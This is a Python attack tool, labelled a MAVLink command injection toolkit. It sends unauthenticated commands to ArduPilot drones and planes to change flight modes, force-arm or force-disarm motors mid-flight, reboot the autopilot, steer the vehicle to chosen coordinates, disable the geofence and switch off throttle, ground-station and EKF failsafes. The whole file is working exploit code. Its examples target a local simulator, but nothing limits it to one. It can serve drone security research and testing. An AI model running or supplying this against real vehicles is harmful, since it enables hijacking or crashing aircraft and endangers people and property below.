"""
MAVLink Command Injection Toolkit

Demonstrates unauthenticated command injection against ArduPilot vehicles
via MAVLink. Supports mode changes, arm/disarm, waypoint manipulation,
and parameter modification.

Usage:
    # Against SITL:
    python3 mavlink_inject.py --connection udp:127.0.0.1:14550 --action recon
    python3 mavlink_inject.py --connection udp:127.0.0.1:14550 --action set-mode --mode LAND
    python3 mavlink_inject.py --connection udp:127.0.0.1:14550 --action arm
    python3 mavlink_inject.py --connection udp:127.0.0.1:14550 --action disarm
    python3 mavlink_inject.py --connection udp:127.0.0.1:14550 --action set-param --param-name FS_THR_ENABLE --param-value 0

For authorized security research only.
"""

import argparse
import time
import sys
from pymavlink import mavutil


COPTER_MODES = {
    'STABILIZE': 0, 'ACRO': 1, 'ALT_HOLD': 2, 'AUTO': 3,
    'GUIDED': 4, 'LOITER': 5, 'RTL': 6, 'CIRCLE': 7,
    'LAND': 9, 'DRIFT': 11, 'SPORT': 13, 'FLIP': 14,
    'AUTOTUNE': 15, 'POSHOLD': 16, 'BRAKE': 17, 'THROW': 18,
    'SMART_RTL': 21, 'FLOWHOLD': 22, 'FOLLOW': 23, 'ZIGZAG': 24,
}

PLANE_MODES = {
    'MANUAL': 0, 'CIRCLE': 1, 'STABILIZE': 2, 'TRAINING': 3,
    'ACRO': 4, 'FBWA': 5, 'FBWB': 6, 'CRUISE': 7,
    'AUTOTUNE': 8, 'AUTO': 10, 'RTL': 11, 'LOITER': 12,
    'GUIDED': 15, 'QSTABILIZE': 17, 'QHOVER': 18, 'QLOITER': 19,
    'QLAND': 20, 'QRTL': 21,
}


class MAVLinkInjector:
    def __init__(self, connection_string, baud=57600):
        self.conn_str = connection_string
        self.baud = baud
        self.conn = None
        self.target_system = 1
        self.target_component = 1

    def connect(self):
        print(f"[*] Connecting to {self.conn_str}...")
        self.conn = mavutil.mavlink_connection(self.conn_str, baud=self.baud)
        print("[*] Waiting for heartbeat...")
        msg = self.conn.wait_heartbeat(timeout=30)
        if msg:
            self.target_system = msg.get_srcSystem()
            self.target_component = msg.get_srcComponent()
            armed = bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
            print(f"[+] Connected to system {self.target_system} "
                  f"component {self.target_component} (armed={armed})")
            return True
        print("[-] No heartbeat received")
        return False

    def send_heartbeat(self):
        """Send a GCS heartbeat to keep the link alive."""
        self.conn.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_GCS,
            mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            0, 0, 0
        )

    def set_mode(self, mode_name, vehicle_type='copter'):
        """Change the vehicle's flight mode."""
        modes = COPTER_MODES if vehicle_type == 'copter' else PLANE_MODES
        mode_name_upper = mode_name.upper()

        if mode_name_upper not in modes:
            print(f"[-] Unknown mode: {mode_name_upper}")
            print(f"    Available: {', '.join(modes.keys())}")
            return False

        mode_id = modes[mode_name_upper]

        print(f"[*] Setting mode to {mode_name_upper} (id={mode_id})...")
        self.conn.mav.set_mode_send(
            self.target_system,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            mode_id
        )

        ack = self.conn.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
        if ack:
            result = ack.result
            if result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                print(f"[+] Mode changed to {mode_name_upper}")
                return True
            else:
                print(f"[-] Mode change rejected: result={result}")
                return False

        print("[?] No ACK received (mode may have changed)")
        return None

    def arm(self, force=False):
        """Arm the vehicle."""
        param2 = 21196.0 if force else 0.0
        action = "FORCE ARM" if force else "ARM"

        print(f"[*] Sending {action} command...")
        self.conn.mav.command_long_send(
            self.target_system,
            self.target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,  # confirmation
            1,  # param1: 1=arm
            param2,  # param2: 21196=force
            0, 0, 0, 0, 0
        )

        ack = self.conn.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
        if ack and ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            print(f"[+] Vehicle ARMED {'(forced)' if force else ''}")
            return True
        elif ack:
            print(f"[-] Arm rejected: result={ack.result}")
            return False
        print("[?] No ACK received")
        return None

    def disarm(self, force=False):
        """Disarm the vehicle (dangerous mid-flight!)."""
        param2 = 21196.0 if force else 0.0
        action = "FORCE DISARM" if force else "DISARM"

        print(f"[*] Sending {action} command...")
        self.conn.mav.command_long_send(
            self.target_system,
            self.target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,
            0,  # param1: 0=disarm
            param2,
            0, 0, 0, 0, 0
        )

        ack = self.conn.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
        if ack and ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            print(f"[+] Vehicle DISARMED {'(forced)' if force else ''}")
            return True
        elif ack:
            print(f"[-] Disarm rejected: result={ack.result}")
            return False
        print("[?] No ACK received")
        return None

    def set_parameter(self, param_name, param_value, param_type=None):
        """Set a vehicle parameter via PARAM_SET."""
        if param_type is None:
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_REAL32

        print(f"[*] Setting {param_name} = {param_value}...")

        # Pad param name to 16 chars
        param_id = param_name.encode('ascii')[:16].ljust(16, b'\x00')

        self.conn.mav.param_set_send(
            self.target_system,
            self.target_component,
            param_id,
            float(param_value),
            param_type
        )

        ack = self.conn.recv_match(type='PARAM_VALUE', blocking=True, timeout=5)
        if ack and ack.param_id.rstrip('\x00') == param_name:
            print(f"[+] {param_name} set to {ack.param_value}")
            return True
        print(f"[?] No confirmation for {param_name}")
        return None

    def read_parameter(self, param_name):
        """Read a single parameter value."""
        param_id = param_name.encode('ascii')[:16].ljust(16, b'\x00')

        self.conn.mav.param_request_read_send(
            self.target_system,
            self.target_component,
            param_id,
            -1  # use name, not index
        )

        msg = self.conn.recv_match(type='PARAM_VALUE', blocking=True, timeout=5)
        if msg:
            print(f"[+] {msg.param_id.rstrip(chr(0))} = {msg.param_value}")
            return msg.param_value
        print(f"[-] Could not read {param_name}")
        return None

    def set_guided_target(self, lat, lon, alt):
        """Send a guided mode position target (must be in GUIDED mode)."""
        print(f"[*] Setting guided target: lat={lat} lon={lon} alt={alt}m...")

        self.conn.mav.set_position_target_global_int_send(
            0,  # time_boot_ms
            self.target_system,
            self.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,  # type_mask: use only lat/lon/alt
            int(lat * 1e7),
            int(lon * 1e7),
            alt,
            0, 0, 0,  # velocity
            0, 0, 0,  # acceleration
            0, 0  # yaw, yaw_rate
        )
        print(f"[+] Guided target sent")

    def reboot(self):
        """Send a preflight reboot command."""
        print("[*] Sending REBOOT command...")
        self.conn.mav.command_long_send(
            self.target_system,
            self.target_component,
            mavutil.mavlink.MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN,
            0,
            1,  # param1: 1=reboot autopilot
            0, 0, 0, 0, 0, 0
        )

        ack = self.conn.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
        if ack and ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            print("[+] Reboot accepted")
            return True
        elif ack:
            print(f"[-] Reboot rejected: result={ack.result}")
        return False

    def disable_geofence(self):
        """Disable the geofence."""
        print("[*] Disabling geofence...")
        return self.set_parameter('FENCE_ENABLE', 0)

    def disable_failsafes(self):
        """Disable critical failsafe mechanisms."""
        print("[*] Disabling failsafes...")
        results = []
        results.append(self.set_parameter('FS_THR_ENABLE', 0))
        results.append(self.set_parameter('FS_GCS_ENABLE', 0))
        results.append(self.set_parameter('FS_EKF_ACTION', 0))
        return results

    def protocol_info(self):
        """Gather protocol version and signing information."""
        print("[*] Gathering protocol information...")

        self.conn.mav.command_long_send(
            self.target_system,
            self.target_component,
            mavutil.mavlink.MAV_CMD_REQUEST_PROTOCOL_VERSION,
            0, 1, 0, 0, 0, 0, 0, 0
        )

        msg = self.conn.recv_match(type='PROTOCOL_VERSION', blocking=True, timeout=5)
        if msg:
            print(f"[+] Protocol version: {msg.version}")
            print(f"    Min version: {msg.min_version}")
            print(f"    Max version: {msg.max_version}")
        else:
            print("[?] No PROTOCOL_VERSION response")


def main():
    parser = argparse.ArgumentParser(description='MAVLink Command Injection')
    parser.add_argument('--connection', '-c', default='udp:127.0.0.1:14550')
    parser.add_argument('--baud', '-b', type=int, default=57600)
    parser.add_argument('--action', '-a', required=True,
                        choices=['recon', 'set-mode', 'arm', 'force-arm',
                                 'disarm', 'force-disarm', 'set-param',
                                 'read-param', 'goto', 'reboot',
                                 'disable-fence', 'disable-failsafes',
                                 'protocol-info'])
    parser.add_argument('--mode', help='Flight mode name')
    parser.add_argument('--vehicle', default='copter', choices=['copter', 'plane'])
    parser.add_argument('--param-name', help='Parameter name')
    parser.add_argument('--param-value', type=float, help='Parameter value')
    parser.add_argument('--lat', type=float, help='Target latitude')
    parser.add_argument('--lon', type=float, help='Target longitude')
    parser.add_argument('--alt', type=float, default=10, help='Target altitude')

    args = parser.parse_args()

    injector = MAVLinkInjector(args.connection, args.baud)
    if not injector.connect():
        sys.exit(1)

    action = args.action

    if action == 'recon':
        injector.protocol_info()
    elif action == 'set-mode':
        if not args.mode:
            print("[-] --mode required")
            sys.exit(1)
        injector.set_mode(args.mode, args.vehicle)
    elif action == 'arm':
        injector.arm()
    elif action == 'force-arm':
        injector.arm(force=True)
    elif action == 'disarm':
        injector.disarm()
    elif action == 'force-disarm':
        injector.disarm(force=True)
    elif action == 'set-param':
        if not args.param_name or args.param_value is None:
            print("[-] --param-name and --param-value required")
            sys.exit(1)
        injector.set_parameter(args.param_name, args.param_value)
    elif action == 'read-param':
        if not args.param_name:
            print("[-] --param-name required")
            sys.exit(1)
        injector.read_parameter(args.param_name)
    elif action == 'goto':
        if not args.lat or not args.lon:
            print("[-] --lat and --lon required")
            sys.exit(1)
        injector.set_guided_target(args.lat, args.lon, args.alt)
    elif action == 'reboot':
        injector.reboot()
    elif action == 'disable-fence':
        injector.disable_geofence()
    elif action == 'disable-failsafes':
        injector.disable_failsafes()
    elif action == 'protocol-info':
        injector.protocol_info()


if __name__ == '__main__':
    main()
